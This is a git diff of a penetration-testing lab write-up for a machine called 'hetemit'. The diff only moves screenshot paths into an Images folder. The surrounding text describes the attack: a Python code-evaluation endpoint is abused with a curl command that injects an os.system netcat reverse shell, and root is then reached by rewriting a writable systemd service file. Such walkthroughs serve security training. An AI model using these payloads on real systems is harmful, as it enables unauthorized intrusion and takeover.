@@ -286,13 +286,13 @@ Enumerated top 200 UDP ports:
 
 #### -Per the nmap scan I navigated to http://192.168.56.117:50000 and found the following webpage:
 
-![](Pasted%20image%2020221016140831.png)
+![](Images/Pasted%20image%2020221016140831.png)
 
 #### -Navigated to http://192.168.56.117:50000/verify as the previous webpage showed a "/verify" directory:
-![](Pasted%20image%2020221016152718.png)
+![](Images/Pasted%20image%2020221016152718.png)
 
 #### -Typed "curl –X post –-data "code=2*2" http://192.168.56.117:50000/verify" and found the following output showing the application performs evaluation:
-![](Pasted%20image%2020221016152913.png)
+![](Images/Pasted%20image%2020221016152913.png)
 
 ---
 
@@ -300,14 +300,14 @@ Enumerated top 200 UDP ports:
 ## os.system  Command Execution
 
 #### -As found from the nmap scan port 50000 is running python 3.6 I typed "os" as a module and find the following showing the existence of it running python 3.6 module:
-![](Pasted%20image%2020221016153044.png)
+![](Images/Pasted%20image%2020221016153044.png)
 
 #### -Ran a netcat listener on port 18000 and typed "curl -X POST --data "code=os.system('nc -e /bin/bash [kali IP] 18000')" http://192.168.241.117:50000/verify" and got a reverse shell:
 
-![](Pasted%20image%2020221016195553.png)
+![](Images/Pasted%20image%2020221016195553.png)
 #os.systemCommandExecution
 
-![](Pasted%20image%2020221016155012.png)
+![](Images/Pasted%20image%2020221016155012.png)
 
 ---
 
@@ -325,7 +325,7 @@ User cmeeks may run the following commands on hetemit:
 	
 #### -Per linpeas.sh I found I can write to "/etc/systemd/system/pythonapp.service":
 
-![](Pasted%20image%2020221016173419.png)
+![](Images/Pasted%20image%2020221016173419.png)
 
 ## Privilege Escalation vector
 ## Modifiable pythonapp.service
@@ -351,7 +351,7 @@ WantedBy=multi-user.target
 
 #### -Modified the ExecStart and User lines, and removed the WorkingDirectory= line:
 
-![](Pasted%20image%2020221016185352.png)
+![](Images/Pasted%20image%2020221016185352.png)
 
 #### - Downloaded a reverse shell named "reverse.sh" in the "/home/cmeeks/restjson_hetemit/" directory
 
@@ -359,7 +359,7 @@ WantedBy=multi-user.target
 
 #### -I then got another reverse listener set up with port 1800 and received a root shell:
 
-![](Pasted%20image%2020221016193909.png)
+![](Images/Pasted%20image%2020221016193909.png)
 
 ---
 
